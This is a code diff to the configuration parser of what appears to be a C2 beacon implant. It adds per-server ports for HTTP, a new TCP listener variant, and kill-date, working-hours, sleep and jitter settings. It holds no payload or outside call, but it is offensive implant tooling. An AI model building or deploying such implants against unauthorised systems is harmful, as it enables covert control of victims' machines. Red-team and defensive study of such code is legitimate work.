@@ -24,12 +24,13 @@ AgentConfig::AgentConfig()
 	
 #if defined(BEACON_HTTP)
 	this->profile.use_ssl       = packer->Unpack8();
-	this->profile.port          = packer->Unpack32();
 	this->profile.servers_count = packer->Unpack32();
 	this->profile.servers       = (BYTE**) MemAllocLocal(this->profile.servers_count * sizeof(LPVOID) );
-	for (int i = 0; i < this->profile.servers_count; i++)
+	this->profile.ports         = (WORD*)  MemAllocLocal(this->profile.servers_count * sizeof(WORD) );
+	for (int i = 0; i < this->profile.servers_count; i++) {
 		this->profile.servers[i] = packer->UnpackBytesCopy(&length);
-
+		this->profile.ports[i]   = (WORD) packer->Unpack32();
+	}
 	this->profile.http_method  = packer->UnpackBytesCopy(&length);
 	this->profile.uri          = packer->UnpackBytesCopy(&length);
 	this->profile.parameter    = packer->UnpackBytesCopy(&length);
@@ -40,15 +41,30 @@ AgentConfig::AgentConfig()
 
 	this->listener_type = 0;
 
+	this->kill_date    = packer->Unpack32();
+	this->working_time = packer->Unpack32();
+	this->sleep_delay  = packer->Unpack32();
+	this->jitter_delay = packer->Unpack32();
+
 #elif defined(BEACON_SMB)
 
 	this->profile.pipename = packer->UnpackBytesCopy(&length);
-	this->listener_type = packer->Unpack32();
+	this->listener_type    = packer->Unpack32();
+	this->kill_date        = packer->Unpack32();
+	this->working_time     = 0;
+	this->sleep_delay      = 0;
+	this->jitter_delay     = 0;
+
+#elif defined(BEACON_TCP)
+	this->profile.prepend = packer->UnpackBytesCopy(&length);
+	this->profile.port    = packer->Unpack32();
+	this->listener_type   = packer->Unpack32();
+	this->kill_date       = packer->Unpack32();
+	this->working_time    = 0;
+	this->sleep_delay     = 0;
+	this->jitter_delay    = 0;
 
 #endif
-
-	this->sleep_delay  = packer->Unpack32();
-	this->jitter_delay = packer->Unpack32();
 
 	this->download_chunk_size = 0x19000;
 
